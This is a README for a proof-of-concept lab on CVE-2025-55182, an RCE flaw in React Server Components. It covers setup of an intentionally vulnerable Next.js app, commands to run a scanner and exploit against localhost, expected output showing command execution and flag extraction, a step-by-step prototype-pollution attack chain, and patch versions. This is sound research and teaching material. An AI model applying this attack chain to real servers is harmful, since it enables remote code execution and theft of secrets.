# CVE-2025-55182 Proof of Concept

Educational demonstration of CVE-2025-55182 vulnerability in React Server Components.

**Warning:** For educational and authorized testing only. Do not use against systems you don't own.

## Overview

This PoC demonstrates CVE-2025-55182, a critical RCE vulnerability in React Server Components. It includes:
- A vulnerable Next.js application (Next.js 15.0.0, React 19.0.0)
- Full RCE exploit demonstrating prototype pollution attack chain
- Proves the vulnerability enables arbitrary code execution

## Setup

### 1. Install the Vulnerable App

```bash
cd poc/vuln-app
npm install
```

### 2. Start the Vulnerable Server

```bash
npm run dev
```

The app will run at http://localhost:5432

### 3. Verify the App is Running

Open http://localhost:5432 in your browser. You should see a simple form.

## Testing the Vulnerability

### Using the Scanner

From the project root:

```bash
./cve-2025-55182-check.sh http://localhost:5432
```

Expected output:
```
[!] VULNERABLE: http://localhost:5432
```

### Using the Exploit

```bash
node poc/exploit/exploit.js http://localhost:5432
```

Expected output:
```
[*] Stage 1: Testing command execution with "id"...
[+] RCE SUCCESSFUL!
[+] Command output: uid=502(AKJ) gid=20(staff) groups=20(staff)...

[*] Stage 2: Extracting FLAG from environment...
[+] FLAG EXTRACTED!
[+] FLAG: CTF{cve_2025_55182_rce_prototype_pollution}

[*] Attack flow:
    1. Sent malicious Server Action payload
    2. Triggered prototype pollution via $1:__proto__:then
    3. Injected Function constructor via _formData.get
    4. Executed: child_process.execSync("echo $FLAG")
    5. Result returned in error digest field
    6. Extracted FLAG from response body
```

## Understanding the Exploit

### The Vulnerability

CVE-2025-55182 exploits three weaknesses:

1. **Path Traversal**: Flight protocol references like `$1:property:nested` are traversed without validation
2. **Fake Chunk Injection**: Attackers can craft objects that mimic internal Chunk structures
3. **Function Constructor**: Replace `_formData.get` with Function constructor for RCE

### What This PoC Demonstrates

This exploit achieves full RCE and successfully extracts the FLAG:
1. **Prototype Pollution**: Exploits `$1:__proto__:then` to access prototype chain
2. **Fake Chunk Injection**: Crafts object with `status: "resolved_model"` mimicking internal chunks
3. **Function Constructor Injection**: Replaces `_formData.get` with `$1:constructor:constructor`
4. **Code Execution**: Uses `_prefix` field to execute `child_process.execSync()`
5. **Data Exfiltration**: Command output returned in error digest field

The exploit executes arbitrary OS commands and extracts environment variables (FLAG) from the vulnerable server.

## Remediation

### Upgrade to Patched Versions

```bash
cd vuln-app
npm install next@latest react@latest react-dom@latest
```

Patched versions:
- Next.js: 15.0.5+, 15.1.9+, 15.2.6+, 15.3.6+, 15.4.8+, 15.5.7+, 16.0.7+
- React: 19.0.1+, 19.1.2+, 19.2.1+

### Verify the Fix

After upgrading, test again:

```bash
../../cve-2025-55182-check.sh http://localhost:5432
```

Expected output:
```
[+] SAFE: http://localhost:5432
```

## Environment

The vulnerable app has a FLAG in the environment:
```
FLAG=CTF{cve_2025_55182_rce_prototype_pollution}
```

In a real exploit, attackers could read this and other environment variables containing secrets, API keys, database credentials, etc.

## Disclaimer

This proof of concept is provided for educational and research purposes only. Always obtain proper authorization before testing any system for vulnerabilities.

## References

- React Advisory: https://react.dev/blog/2025/12/03/critical-security-vulnerability
- Fix Commit: https://github.com/facebook/react/commit/7dc903cd29
- CVE Details: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-55182
